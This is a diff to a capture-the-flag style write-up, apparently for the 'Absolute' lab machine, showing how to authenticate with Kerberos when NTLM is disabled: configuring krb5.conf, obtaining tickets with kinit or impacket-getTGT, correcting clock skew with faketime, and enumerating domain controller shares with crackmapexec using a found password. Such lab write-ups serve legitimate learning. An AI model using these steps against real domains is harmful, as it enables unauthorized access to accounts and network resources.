@@ -53,6 +53,9 @@ Darkmoonsky248girl
 ```
 
 ### Kerberos Auth
+##### Failed without Kerberos
+`STATUS_ACCOUNT_RESTRICTION` typically means NTLM is disabled, and need to use Kerberos for auth. That works:
+
 ```bash
 crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl'
 SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
@@ -60,4 +63,72 @@ SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay:Dark
 crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k
 SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW 
+```
+
+##### Method 1, Kinit
+It needs to config `/etc/resolv.conf` by adding the Kali's IP as nameserver and `/etc/krb5.conf`.
+
+```conf
+[libdefaults]   
+    	default_realm = ABSOLUTE.HTB
+
+[realms]
+        ABSOLUTE.HTB = {
+                kdc = dc.absolute.htb
+        }
+```
+
+Otherwise, it'll be super slow even it's worked.
+
+```bash
+kinit d.klay
+Password for d.klay@ABSOLUTE.HTB: 
+
+klist
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: d.klay@ABSOLUTE.HTB
+
+Valid starting     Expires            Service principal
+20/11/23 17:31:35  20/11/23 21:31:35  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
+        renew until 20/11/23 21:31:35
+
+sudo ntpdate -u absolute.htb
+2023-11-20 17:32:37.857792 (+1300) +25184.900725 +/- 0.109022 absolute.htb 10.129.229.59 s1 no-leap
+CLOCK: time stepped by 25184.900725
+
+faketime '2023-11-20 17:36:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
+❯ faketime '2023-11-20 17:36:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k --shares
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
+SMB         10.129.229.59   445    DC               [+] Enumerated shares
+SMB         10.129.229.59   445    DC               Share           Permissions     Remark
+SMB         10.129.229.59   445    DC               -----           -----------     ------
+SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.229.59   445    DC               C$                              Default share
+SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.229.59   445    DC               Shared                          
+SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share 
+```
+
+##### Method 2, impacket-getTGT
+I'd perfer it since it doesn't need to make configurations.
+
+```bash
+impacket-getTGT absolute.htb/d.klay:Darkmoonsky248girl -dc-ip dc.absolute.htb
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Saving ticket in d.klay.ccache
+
+rm /tmp/krb5cc_1000
+klist
+klist: No credentials cache found (filename: /tmp/krb5cc_1000)
+
+export KRB5CCNAME=d.klay.ccache
+faketime '2023-11-20 17:50:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k --shares
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
+SMB         10.129.229.59   445    DC               [+] Enumerated shares
 ```
